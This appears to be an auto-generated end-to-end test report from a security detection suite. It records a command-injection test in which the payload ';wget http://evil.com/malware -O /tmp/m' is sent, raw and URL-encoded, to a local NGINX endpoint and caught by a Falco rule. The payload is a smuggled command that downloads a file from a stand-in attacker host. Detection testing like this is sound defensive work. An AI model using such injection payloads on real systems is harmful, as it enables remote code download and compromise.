name: test_e2e_with_logs[767_CMDI_WGET_001]
description:
## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMDI_WGET_001` |
| **Name** | Wget malware download |
| **Category** | CMDINJ |
| **Subcategory** | malware_download |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `;wget http://evil.com/malware -O /tmp/m`
- **Encoded**: `%3Bwget%20http%3A%2F%2Fevil.com%2Fmalware%20-O%20%2Ftmp%2Fm`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~46000ms
- **Timestamp**: 08:55:43.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Command injection via semicolon` |
| **Matched Rule** | `[NGINX CMDi] Command injection via semicolon test_id=CMDI_WGET_001-1772268943205-ux0eno pattern_id=CMDI_WGET_001 uri=/?q=%3Bwget%20http%3A%2F%2Fevil.com%2Fmalware%20-O%20%2Ftmp%2Fm client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Command injection via semicolon test_id=CMDI_WGET_001-1772268943205-ux0eno pattern_id=CMDI_WGET_001 uri=/?q=%3Bwget%20http%3A%2F%2Fevil.com%2Fmalware%20-O%20%2Ftmp%2Fm client=127.0.0.1

**Falco Log Entry**:
```
08:55:43.000000000: Critical [NGINX CMDi] Command injection via semicolon test_id=CMDI_WGET_001-1772268943205-ux0eno pattern_id=CMDI_WGET_001 uri=/?q=%3Bwget%20http%3A%2F%2Fevil.com%2Fmalware%20-O%20%2Ftmp%2Fm client=127.0.0.1
```
